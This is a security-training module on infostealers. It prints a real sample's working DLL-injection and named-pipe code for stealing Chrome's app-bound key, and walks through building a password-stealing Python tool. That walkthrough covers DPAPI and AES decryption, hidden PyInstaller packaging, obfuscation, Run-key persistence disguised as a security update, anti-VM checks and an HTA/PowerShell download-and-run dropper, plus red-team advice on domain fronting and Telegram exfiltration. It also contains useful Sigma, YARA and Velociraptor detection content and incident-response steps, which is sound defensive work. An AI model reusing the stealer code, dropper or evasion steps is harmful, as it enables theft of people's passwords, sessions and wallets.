🧠 The Core Truth

An infostealer is not a sophisticated exploit. It is a burglar that walks through the front door after you unlock it. Modern operating systems and browsers store enormous amounts of sensitive data — passwords, cookies, session tokens, wallet keys, chat sessions — and protect it with encryption that is only as strong as the currently logged-in user. An infostealer simply asks Windows for the keys, reads the files, and ships everything to a server.

Why this matters: The attacker's job is not to "crack" your encryption. It is to run code as you. Once code runs in your user context, it inherits your trust, your keys, and your access. The infostealer is the perfect expression of that principle: identity is the perimeter, and your session is the crown jewel.

🎯 Soldier Translation

Imagine a thief gets inside your house while you are asleep. They don't break the safe. They look in your desk drawer for the password book, copy your credit cards, photograph your ID, grab your phone to read your messages, and take photos of your crypto wallet seed phrase. Then they walk out and mail everything to their boss. You never knew they were there. That's an infostealer. It doesn't destroy your house. It empties it quietly.

The malware is not the threat. The threat is that your digital life is stored in files the malware can read.

"Malware is just software that does bad things."

There is no magic here. The stealer uses the same Windows APIs, the same Python libraries, and the same browser files that legitimate software uses. The difference is intent. If you understand how normal programs store your data, you understand how malware steals it.

Red: Stop treating malware like a black box. Read the source. The techniques are boring, repeatable, and powerful. Blue: If your detection only looks for "evil" APIs, you will miss everything. Look for abnormal sequences of normal operations.

🧒 Layman From Zero — The Building Blocks

Before we go deeper, make sure you understand the words the malware uses against you.

🦠 What is malware?

Plain answer: Any program designed to do something harmful or unwanted without your knowledge. A calculator is software. A program that secretly copies your passwords is malware. The difference is intent and consent.

🖥️ What is a process?

Plain answer: A running program. When you open Chrome, Windows creates a Chrome process — a private memory box with its own code, data, and permissions. Windows tries to keep each process in its own box so one program cannot mess with another.

🧠 What is memory?

Plain answer: The temporary workspace where a running program holds its live data. When Chrome is open, your saved passwords, decrypted cookies, and session keys live in memory. If malware can read or run code inside that memory, it can steal those secrets.

📦 What is a DLL?

Plain answer: A Dynamic Link Library is a file containing reusable code that Windows programs can load at runtime. Think of it as a shared toolbox. Malware can trick a legitimate process into loading a malicious DLL, making the process do things it was never meant to do.

📤 What is exfiltration?

Plain answer: Stealing data out of a network. The malware copies your files locally, then exfiltrates them — sends them over the internet to an attacker-controlled server. Exfiltration is the moment the burglar mails your belongings home.

🔐 What is DPAPI?

Plain answer: The Data Protection API is Windows' built-in encryption service. Programs like Chrome ask DPAPI to encrypt saved passwords. DPAPI ties the encryption to your Windows user account, so only you can decrypt it — unless malware is running as you.

🔗 What does "app-bound" mean?

Plain answer: A newer Chrome protection that binds encryption keys to the specific browser process, not just your user account. Even if malware runs as you, it cannot decrypt the key from outside Chrome. That is why this sample injects a DLL into Chrome — to make Chrome itself unlock the key.

🔑 Why do browsers store passwords?

Plain answer: Because you asked them to. Browsers save passwords so you do not have to type them every time. They store them in files like Login Data and protect them with DPAPI or app-bound keys. Malware simply reads those files and asks Windows to decrypt them.

🎟️ What is a token?

Plain answer: A token is a temporary proof-of-identity issued after you log in. Instead of sending your password every time, Discord or your browser sends a token. If a thief steals your token, they can use it to impersonate you without knowing your password. Tokens are often more valuable than passwords.

🦠 What Is An Infostealer?

An infostealer is a category of malware designed to extract valuable information from an infected system and exfiltrate it to an attacker-controlled server. Unlike ransomware, it does not announce itself. Unlike worms, it does not spread. It arrives, harvests, and leaves.

Why infostealers are so common

They are high return, low risk, and easy to build. A single infection can yield passwords, session cookies, cryptocurrency wallets, chat histories, and corporate credentials. The attacker does not need to maintain persistence or navigate a network. They just need the victim to run one file once.

Common targets of modern infostealers:

  • Browser saved passwords and cookies
  • Autofill data and credit cards
  • Cryptocurrency wallets and browser extensions
  • Discord, Telegram, and WhatsApp session tokens
  • VPN and FTP credentials
  • Files matching sensitive keywords on Desktop/Documents/Downloads
  • System information and screenshots

🔥 Infostealer Trends 2024–2026

The sample analyzed in this module is representative of a much larger criminal economy. Below are the dominant infostealer trends from 2024 through 2026, observed in public reporting, sandbox telemetry, and threat-intel feeds.

Why trends matter

Malware is a fashion industry. The techniques that work get copied, productised, and sold. If you only study one sample, you miss the ecosystem. These trends show where attackers are investing their effort — and where defenders must focus.

Lumma Stealer Advanced

A C++ stealer sold as MaaS since late 2022, heavily active in 2024–2025. Targets browsers, crypto wallets, Discord/Steam/Outlook sessions, and MFA codes. Uses app-bound key bypass via COM hijacking and injected JavaScript, not just DLL injection.

Stealc Mid-tier

A lightweight stealer-as-a-service with aggressive marketing on Russian-language forums. Modular: browser theft, FTP/IM clients, crypto clipper, loader. Often delivered via cracked software, fake update pages, and SEO-poisoned downloads.

Meduza Stealer Mid-tier

Emerging in 2024 as a competitor to Stealc. Advertises "no Russian CIS targets" to attract Western affiliates. Uses Telegram bots for exfiltration and panel access, and supports geofencing by victim IP.

Vidar Advanced

One of the longest-running stealers, frequently rebranded. Known for wide browser coverage, screenshot capture, and wallet hunting. Often paired with initial-access brokers who sell corporate credentials onward.

Raccoon Stealer 2.0 Mid-tier

Returned in 2022 after the original operator's arrest. Sold as a subscription with a polished web panel. Focuses on credentials, cookies, and crypto wallets. Frequently delivered by malvertising and exploit kits.

Atomic MacOS Stealer (AMOS) Advanced

The first commercially successful macOS-focused stealer-as-a-service. Steals Keychain passwords, browser data, crypto wallets, and file system files. Distributed via fake software installers and malicious ads targeting Mac users.

Rust-based stealers Advanced

Newer families (e.g., Luca Stealer, Havoc-infostealer modules) are written in Rust to evade signature detection and complicate reverse engineering. Rust binaries have unusual imports and control flow that break many automated analysis tools.

Stealer-as-a-Service (SaaS / MaaS) Accessible

Affiliates rent a stealer binary + web panel for $100–$300/month. The operator handles infrastructure, updates, and support. This has democratised credential theft: low-skill criminals now run campaigns at scale.

Telegram / Discord C2 panels Accessible

Many stealers exfiltrate to Telegram bots or Discord webhooks instead of self-hosted servers. This gives operators free HTTPS infrastructure, push notifications, and easy mobile access to stolen logs.

Cryptocurrency clipper modules Mid-tier

A clipper monitors the clipboard for crypto addresses and swaps them with the attacker's address. The victim copies 1Abc..., pastes 1Xyz..., and sends funds to the thief. Simple, silent, lucrative.

Loader + stealer bundles Advanced

Modern delivery chains use a loader (e.g., PrivateLoader, SmokeLoader, GCleaner) to fingerprint the victim and drop multiple payloads: a stealer, a clipper, a RAT, and sometimes ransomware. One infection becomes many.

"The sample is a specimen, not the species."

Studying one stealer teaches you the mechanics. Studying the ecosystem teaches you the business model. The business model is what drives the attacks you will actually face.

Red: Borrow ideas from commercial stealers: modularity, SaaS panels, clipper modules, and loader bundles. Blue: Defend against the bundle, not the binary. A stealer is often just the first guest at the party.

🖥️ The Three Machines

Every malware operation has roles. This one has three. Understanding the separation is critical for both attack and defense.

🏗️ Builder Machine

Controlled by: Attacker/operator

Runs generator.py and stealer_template.py. Customizes the payload with a target name and compiles it into a single hidden EXE using PyInstaller. This is where the weapon is manufactured.

🎯 Victim Machine

Controlled by: Target user

Runs the compiled .exe after delivery via PowerShell/VBScript. This machine is robbed. All browser data, tokens, wallets, and sensitive files are extracted from here.

🌐 C2 / Receiver Machine

Controlled by: Attacker/operator

Runs receiver.py on 113.30.148.162:8080. Receives exfiltrated data, stores it under /opt/reports/<uuid>/, and renders HTML reports for the operator.

This repository contains analysis only. It does not provide instructions to deploy the malware or execute the compiled EXE. If you choose to run this sample, you do so entirely at your own risk. The builder and receiver are operator-controlled; the EXE is what harms the target.

💉 Process Injection Deep Dive

This is the crown jewel of the sample. Modern Chrome encrypts cookies and passwords with an app-bound key that is tied to the browser process. The stealer cannot decrypt the key from outside Chrome, so it forces Chrome to do the decryption for it.

Why process injection?

Windows keeps processes separated in their own memory boxes. The app-bound key is locked to the browser process. By injecting a DLL into a suspended browser process, the malware becomes the browser long enough to decrypt the key and send it back through a named pipe.

The injection sequence

1. FIND

Read registry for Chrome/Edge/Brave path

→
2. LAUNCH

Start browser in suspended state

→
3. DROP

Decode base64 DLL to %TEMP%

→
4. INJECT

LoadLibraryA via remote thread

→
5. DECRYPT

Send key over named pipe, get plaintext

→
6. CLEAN

Kill browser process, close pipe

Find the browser on disk

📜 Evidence: Registry lookup

def get_install_path(executable_name):
    for hive in REGISTRY_PATHS["Hives"]:
        for subpath in REGISTRY_PATHS["Subpaths"]:
            try:
                with winreg.OpenKey(hive, subpath + "\\" + executable_name) as key:
                    install_path, _ = winreg.QueryValueEx(key, None)
                    return install_path
            except FileNotFoundError:
                continue
    return None

What it does: Looks in HKLM and HKCU for where Chrome/Edge/Brave is installed. The malware needs the real browser executable to launch as a disguise.

Launch the browser in suspended state

📜 Evidence: Suspended process creation

ctypes.windll.kernel32.CreateProcessW(
    app_path, None, None, None, False, 0x08000004,
    None, None, ctypes.byref(startup), ctypes.byref(proc_info)
)

Key flag: 0x08000004

  • 0x00000004 = CREATE_SUSPENDED
  • 0x08000000 = CREATE_NO_WINDOW

The browser process exists but is frozen. The malware can operate inside it before the browser even wakes up.

Decode and drop the hidden DLL

📜 Evidence: DLL unwrapping

WRAPPED_DLL = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA...'

dll_path, dll_len = unwrap_dll(base64.b64decode(WRAPPED_DLL))

def unwrap_dll(file_bytes):
    temp_dir = tempfile.mkdtemp()
    filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16)) + ".dll"
    file_path = os.path.abspath(os.path.join(temp_dir, filename))
    with open(file_path, "wb") as f:
        f.write(file_bytes)
    return file_path.encode("ascii"), len(file_path) + 1

What it does: The malware carries a ~337 KB base64-encoded Windows DLL inside itself. At runtime it decodes the DLL, writes it to a random temp folder with a 16-character filename, and prepares it for injection. The first decoded bytes are 4D 5A — "MZ" — the signature of every Windows executable.

Inject the DLL into the sleeping browser

📜 Evidence: Classic DLL injection

def inject_dll(dll_path, dll_len, process_handle):
    arg_address = kernel32.VirtualAllocEx(process_handle, None, dll_len, 0x3000, 0x04)
    written = c_size_t(0)
    kernel32.WriteProcessMemory(process_handle, arg_address, dll_path, dll_len, byref(written))
    h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
    thread_id = c_ulong(0)
    kernel32.CreateRemoteThread(process_handle, None, 0, h_loadlib, arg_address, 0, byref(thread_id))

Line by line:

  1. VirtualAllocEx — allocate memory inside the browser process
  2. WriteProcessMemory — write the DLL path into that memory
  3. GetModuleHandleA("kernel32.dll") — find kernel32 in the browser
  4. GetProcAddress("LoadLibraryA") — find the function that loads DLLs
  5. CreateRemoteThread — start a thread inside the browser that loads our DLL

Result: The browser process loads and executes the attacker's DLL. To Windows, it looks like the browser did it.

Communicate through a named pipe

📜 Evidence: Named pipe setup and key exchange

def setup_pipe(pipe_name):
    return win32pipe.CreateNamedPipe(
        pipe_name, win32pipe.PIPE_ACCESS_DUPLEX,
        win32pipe.PIPE_TYPE_BYTE | win32pipe.PIPE_READMODE_BYTE | win32pipe.PIPE_WAIT,
        1, 65536, 65536, 0, None
    )

def decrypt_key(pipe, encrypted_key):
    length_prefix = len(encrypted_key).to_bytes(4, byteorder='little', signed=False)
    win32pipe.ConnectNamedPipe(pipe, None)
    win32file.WriteFile(pipe, length_prefix + encrypted_key)
    _, data = win32file.ReadFile(pipe, 4096)
    return data.decode('ascii').strip()

What it does: The injected DLL runs inside the browser. It decrypts Chrome's app-bound key and sends the plaintext back over a named pipe. The pipe name is derived deterministically from the browser process ID using a ROTL32 mixing function (pid_to_tag in the source) so both sides know where to connect without passing the name through command-line arguments.

"Evasion is a cat and mouse game."

Chrome's app-bound encryption was added to stop exactly this kind of theft. The malware's response is to wear Chrome's uniform and ask the vault to open itself. Every defense creates a new offense. Your job is not to build the perfect wall — it is to make the attack so noisy and expensive that it gets caught.

Red: Evasion is temporary. Today's trick becomes tomorrow's signature. Keep learning new tricks. Blue: Don't rely on a single control. Layer detection: process creation flags, DLL loads from temp, named pipes, browser profile access, and outbound C2.

🧪 Safe Lab Architecture

This section is adapted from FIELD_MANUAL.md. Follow it exactly if you test this sample.

⚠️ Rule Zero

If you run the EXE on a machine with real accounts, that machine is the victim. Treat every run as a live-fire exercise.

Recommended network layout

[Your real network]
        |
        | (isolated, no routing)
        v
[Hypervisor host] ----> [Victim VM - Windows 10/11]
        |                    |
        |                    | HTTP to C2 only
        |                    v
        |------------> [C2 VM - Linux]
                             |
                             | (isolated from internet or tightly controlled)
                             v
                        [Optional: internet for Discord API validation]

Building the lab with VirtualBox or VMware

Hypervisor checklist

  1. Install VirtualBox or VMware Workstation on a host with at least 16 GB RAM and 100 GB free disk.
  2. Create an internal or host-only network adapter. Do not bridge to your real LAN.
  3. Disable shared folders, drag-and-drop, and clipboard sharing between host and VMs.
  4. Ensure the host firewall blocks VM traffic to your real network.

Windows victim VM

  1. Install Windows 10/11 Enterprise or Pro evaluation ISO.
  2. Create a local throwaway user account. Do not sign in with a Microsoft account.
  3. Install Chrome, Edge, or Brave. Install Discord Desktop if testing token theft.
  4. Disable Windows Defender real-time protection only if you need unobstructed dynamic testing; otherwise, use it as a detection test.
  5. Generate fake data: save a fake password in Chrome, create a passwords.txt on Desktop, and add a fake wallet seed file.

Linux C2 VM

  1. Install Debian or Ubuntu Server with a minimal footprint.
  2. Set a static IP on the host-only adapter, e.g. 192.168.56.10/24.
  3. Install Python 3 and Flask: sudo apt update && sudo apt install python3 python3-pip && pip3 install flask.
  4. Copy receiver.py to /opt/receiver.py and ensure /opt/reports exists.
  5. Optionally install tcpdump or Wireshark to capture exfiltration traffic.

Snapshot discipline

  1. Before running anything malicious, snapshot both VMs: clean-c2 and clean-victim.
  2. Label snapshots with date and purpose.
  3. After each test run, revert both VMs. Do not "clean up manually" — revert.
  4. Keep a separate baseline snapshot before installing any malware-related tooling.

Fake data generation

🛠️ Malware Development Deep Dive — Build a Minimal Educational Stealer

This section is purely educational. We are going to build the smallest possible stealer in Python that demonstrates the core technique: reading browser SQLite databases and decrypting them with DPAPI. It does not use injection, persistence, or exfiltration. It is a lab tool for understanding, not a weapon.

⚠️ Educational boundary

Run this only inside an isolated lab VM with fake data. Never run it on a machine with real accounts. The code below is intentionally incomplete and omits operational features so it cannot be used as-is in an attack.

Step 1: Enumerate browser files

📜 Lab code: file enumeration

import os
import glob

LOCALAPPDATA = os.environ.get("LOCALAPPDATA")
APPDATA = os.environ.get("APPDATA")

BROWSERS = {
    "Chrome": os.path.join(LOCALAPPDATA, r"Google\Chrome\User Data"),
    "Edge": os.path.join(LOCALAPPDATA, r"Microsoft\Edge\User Data"),
    "Brave": os.path.join(LOCALAPPDATA, r"BraveSoftware\Brave-Browser\User Data"),
}

def find_login_databases():
    results = []
    for name, base in BROWSERS.items():
        if not os.path.exists(base):
            continue
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 6)]:
            path = os.path.join(base, profile, "Login Data")
            if os.path.exists(path):
                results.append((name, profile, path))
    return results

for browser, profile, db_path in find_login_databases():
    print(f"[{browser}/{profile}] {db_path}")

What it teaches: Malware does not need exploits to find your passwords. It just knows where browsers keep the files.

Step 2: Read the SQLite database

📜 Lab code: SQLite query

import sqlite3
import shutil
import tempfile

def read_logins(db_path):
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(db_path, tmp)
    conn = sqlite3.connect(tmp)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    rows = cursor.fetchall()
    conn.close()
    os.remove(tmp)
    return rows

What it teaches: Browser password files are ordinary SQLite databases. Copying them before opening avoids file-lock conflicts with a running browser.

Step 3: Decrypt with DPAPI (no injection)

📜 Lab code: DPAPI decryption

import json
import base64
import win32crypt
from Crypto.Cipher import AES

def get_legacy_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        state = json.load(f)
    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_legacy_password(encrypted_value, key):
    try:
        iv = encrypted_value[3:15]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_value[15:])[:-16].decode()
    except Exception:
        return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()

What it teaches: DPAPI decryption only works in the same user context. In a lab, run this as the fake victim user. This is the same technique used by the real sample's extract_chromium_legacy function.

Step 4: PyInstaller packaging

📜 Lab command: build a single hidden EXE

python -m PyInstaller --onefile --noconsole --name edu_stealer edu_stealer.py

What it teaches: --onefile bundles the Python interpreter, your script, and all dependencies into one portable EXE. --noconsole hides the terminal window. This is exactly what generator.py does for the real payload.

Step 5: Static evasion basics

Attackers obfuscate or encode their scripts to avoid antivirus signatures. Common techniques include:

  • Base64 / hex encoding of strings and payloads
  • String concatenation to break keyword matches
  • Reflection — loading functions by name at runtime
  • Compression with zlib or marshal
  • PyInstaller UPX packing to compress the EXE and alter signatures
# Simple encoding example — not robust, but illustrates the idea
import base64
cmd = base64.b64encode(b"Invoke-WebRequest http://192.168.56.10/labtest.exe").decode()
print(cmd)  # Defender sees random base64, not the keyword

Step 6: Persistence mechanisms

The analyzed sample has no persistence. Real stealers often add one or more of these so they run again after reboot:

  • Registry Run key — write the EXE path to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  • Scheduled task — use schtasks to run the payload on logon or idle
  • Startup folder — drop a shortcut or LNK in %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
# Educational persistence example — Registry Run key
import winreg
key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
    winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, r"C:\path\to\edu_stealer.exe")

Step 7: Anti-VM / anti-sandbox checks

Malware often refuses to run in analysis environments to frustrate blue teams. Common checks:

  • CPU core count — sandboxes often have only 1–2 cores
  • RAM size — less than 2 GB suggests a sandbox
  • VM artifacts — processes like vmtoolsd.exe, vmwaretray.exe, VBoxService.exe
  • Sleep acceleration detection — call Sleep(10000) and measure real elapsed time
  • Mouse movement / user interaction — no input means no real user
import os
import psutil

def looks_like_vm():
    suspicious = ["vmtoolsd", "vmwaretray", "VBoxService", "qemu-ga", "xenservice"]
    for proc in psutil.process_iter(["name"]):
        if proc.info["name"] and any(s.lower() in proc.info["name"].lower() for s in suspicious):
            return True
    if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2 * 1024**3:
        return True
    return False

if looks_like_vm():
    print("[+] Lab environment detected — exiting for safety")
else:
    print("[+] Continuing...")

"Build it small before you fear it big."

A minimal educational stealer strips away the noise and shows you the core trick: browsers store secrets in files, and Windows will decrypt those secrets for any code running as you. Once you can build that, you understand what every real stealer is doing — just with more polish and more crime.

Red: Master the basics first. Evasion and persistence are layers on top of a working core. Blue: If you can detect the core behavior — browser file access + DPAPI — you catch most stealers regardless of their wrapper.

🛡️ Detection Rules

The sample is noisy. These Sigma-style and YARA-style rules target its most distinctive behaviors.

Sigma: Browser kill followed by profile access

📜 Evidence: Sigma-style detection rule

title: Browser Kill Followed by Profile Access
logsource:
  category: process_creation
  product: windows
detection:
  selection_taskkill:
    CommandLine|contains: 'taskkill /F /IM chrome.exe'
  selection_fileaccess:
    TargetFilename|contains:
      - '\Google\Chrome\User Data\Login Data'
      - '\Google\Chrome\User Data\Network\Cookies'
  condition: selection_taskkill and selection_fileaccess

Why it works: The stealer kills Chrome before reading its SQLite databases. Seeing taskkill immediately followed by access to Login Data or Cookies is highly suspicious.

Sigma: Suspended browser creation

📜 Evidence: Suspended process creation rule

title: Suspended Browser Process Creation
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - 'chrome.exe'
      - 'msedge.exe'
      - 'brave.exe'
  create_suspended:
    CreationOptions|contains: '0x08000004'
  condition: selection and create_suspended

Why it works: Browsers are almost never launched suspended by normal users. The CREATE_SUSPENDED flag is a strong indicator of injection preparation.

YARA: Named pipe indicators

📜 Evidence: YARA-style rule

rule InfostealerNamedPipe {
    strings:
        $pipe = "\\\\.\\pipe\\" ascii wide
        $createpipe = "CreateNamedPipe" ascii wide
        $loadlib = "LoadLibraryA" ascii wide
        $createremote = "CreateRemoteThread" ascii wide
    condition:
        all of them
}

Why it works: The combination of named pipes, remote thread creation, and DLL loading in a single binary is characteristic of local process injection used by stealers.

Behavioral detection opportunities

  • Browser process loading a DLL from %TEMP% with a random name
  • Named pipe creation matching \\.\pipe\[32 hex chars]
  • Mass access to browser profile directories in a loop
  • Copying Login Data, Cookies, and Local State files
  • A single process accessing Chrome, Edge, Brave, Firefox, Discord, Telegram, WhatsApp, and wallet paths in sequence
  • Outbound HTTP POSTs to /create_log, /log_data, /log_files
  • Discord API calls from non-browser processes

🎯 Red-Team Automation — Delivery, C2, and Exfiltration

This section maps how a red team operationalises a stealer beyond the basic sample. The original repo is a proof of concept; real campaigns add automation at every stage.

Delivery chain automation

Modern campaigns use PowerShell, VBScript, HTA, ISO/IMG mounts, and malicious LNK files to download and run the payload. Each layer is chosen to bypass a specific control: macros, Mark-of-the-Web, or SmartScreen.

Domain fronting

Route C2 traffic through a trusted CDN by setting the TLS SNI to one hostname and the HTTP Host header to another. Network logs show traffic to a legitimate domain, not the real C2.

Telegram bot exfil

Replace the Flask receiver with a Telegram bot. Stolen logs are sent as messages or documents to a private channel. No server to maintain, free HTTPS, and mobile alerting.

Encrypted archives

Compress stolen files with a password-protected 7z or ZIP before exfiltration. This defeats simple DLP content inspection and makes automated sandbox extraction harder.

Geofencing

Check the victim's public IP or system locale before running. If the victim is outside the target country, the malware exits quietly. This reduces noise and avoids unwanted analyst attention.

📜 Example: PowerShell/HTA dropper chain

<!-- edu_dropper.hta -->
<script language="VBScript">
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -w hidden -ep bypass -c iwr http://192.168.56.10/labtest.exe -o $env:APPDATA\labtest.exe; & $env:APPDATA\labtest.exe", 0, False
    self.Close
</script>

Why this matters: HTA files run with fewer restrictions than downloaded EXEs and can invoke PowerShell without spawning an obvious console window. This is one of many ways operators dress up the basic delivery chain from the repo.

"The payload is the easy part. The chain is the craft."

Anyone can write a script that reads browser files. The real skill is getting that script past email filters, endpoint protection, and suspicious users. Red teams spend most of their effort on the chain, not the stealer.

Red: Automate your delivery testing. If one vector fails, rotate to the next. Blue: Detect the chain, not just the payload. The dropper is the weakest link.

🛡️ Blue-Team Counterattack Automation

Defenders do not have to wait for alerts. They can automate collection, detection, and response across the enterprise. Below is a playbook-style reference for countering infostealers at scale.

Velociraptor artifacts

Hunt across endpoints for browser profile access, suspicious DPAPI calls, and processes loading DLLs from %TEMP%. Velociraptor's VQL lets you query live machines like a database.

KAPE collection

Use KAPE to collect browser artifacts, registry hives, event logs, and prefetch files from suspected hosts. Preserve evidence before cleanup or re-imaging.

Sysmon rules

Log file access to Login Data, Network\Cookies, and Web Data. Alert when a non-browser process reads these files, especially after a taskkill event.

PowerShell Script Block Logging

Enable and centralise Script Block Logging and Module Logging. Catch encoded download cradles, Invoke-WebRequest calls, and VBScript execution patterns.

AM/EDR behavioural detection

Look for sequences: process hollowing, remote thread creation, browser launched suspended, DLL loaded from temp, named pipe creation, and outbound HTTP to uncommon IPs.

Sigma rules

Deploy Sigma rules for browser kill + profile access, suspended browser creation, and mass browser profile enumeration. Convert to SIEM queries for Splunk, Sentinel, or Elastic.

Automated IOC extraction

Extract YARA rules, file hashes, import hashes, and network IOCs from stealer samples. Feed them into your EDR, proxy, and DNS blocklists.

Threat intel ingestion

Ingest MISP events and OpenCTI reports for stealer families, C2 panels, and loader infrastructure. Correlate observed IOCs with your telemetry.

SOAR playbooks

Automate response: isolate the host, reset browser sessions, force password resets, notify the user, and open an incident ticket. Speed beats sophistication in containment.

📜 Example: Velociraptor-style hunt for browser profile access

LET BrowserFiles = glob(globs=[
    "C:/Users/*/AppData/Local/Google/Chrome/User Data/*/Login Data",
    "C:/Users/*/AppData/Local/Microsoft/Edge/User Data/*/Login Data",
    "C:/Users/*/AppData/Local/BraveSoftware/Brave-Browser/User Data/*/Login Data"
])

SELECT FullPath, Mtime, Size
FROM stat(filename=BrowserFiles)
WHERE Mtime > now() - 300  // modified in last 5 minutes

What it does: Finds browser password databases modified recently. A stealer copies these files before reading them; the copy operation updates timestamps.

📜 Example: SOAR response playbook outline

Trigger: Sigma rule "Browser Kill Followed by Profile Access"

Actions:
1. Enrich: query asset owner, AD groups, recent logons
2. Contain: isolate host via EDR network containment
3. Preserve: trigger KAPE collection to secure storage
4. Reset: force password reset, revoke browser sessions, revoke Discord/Teams tokens
5. Notify: alert user and service desk
6. Hunt: search for same filename hashes, C2 IP, or delivery domain across estate
7. Ticket: create incident with IOCs and timeline

"The best incident response is automated incident response."

A stealer finishes its work in seconds. Human analysts take minutes or hours. If your response requires a human to read every alert, you have already lost. Automate the boring parts so humans can focus on the hard parts.

Blue: Start with one automated playbook. Isolate host + reset sessions is enough. Add enrichment and hunting later. Red: Assume blue teams are automating. Design your attack to generate alerts that look like noise.

🚨 Incident Response

If you accidentally run this sample on a real machine, speed matters. The malware extracts data within seconds. Use this checklist.

⚠️ Scenario A: You ran the EXE on a real machine
  1. Disconnect from the internet immediately — unplug Ethernet, turn off WiFi
  2. Assume compromise of all browser-saved passwords; change every password from a clean device
  3. Start with email, banking, and crypto exchanges
  4. Assume Discord token stolen; change password, reset 2FA, review authorized apps, log out all sessions
  5. Assume crypto wallets compromised; move funds to new wallets created on a clean machine
  6. Assume files copied; review Desktop/Documents/Downloads for sensitive content
  7. Wipe and rebuild the machine from known-good media
⚠️ Scenario B: You exposed the receiver to the internet
  1. Assume anyone could have dumped your reports
  2. Destroy the VM and rebuild
  3. Do not reuse the IP without firewall rules
⚠️ Scenario C: You accidentally opened the EXE on the wrong VM
  1. Snapshot the running state first if you need evidence
  2. Do not log into anything on that VM
  3. Revert to clean snapshot
